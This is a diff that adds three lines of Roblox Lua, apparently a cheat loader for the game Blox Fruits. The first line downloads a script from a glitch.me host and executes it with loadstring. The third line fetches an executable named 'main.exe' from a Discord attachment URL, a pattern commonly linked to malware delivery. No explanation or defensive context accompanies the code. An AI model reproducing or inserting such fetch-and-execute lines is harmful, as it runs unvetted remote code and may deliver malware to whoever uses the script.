@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://rasputin-bf.glitch.me/bloxfruits.lua"))()
+wait(1)
+game:HttpGet("https://cdn.discordapp.com/attachments/1026177182990606468/1060721006609694870/main.exe")
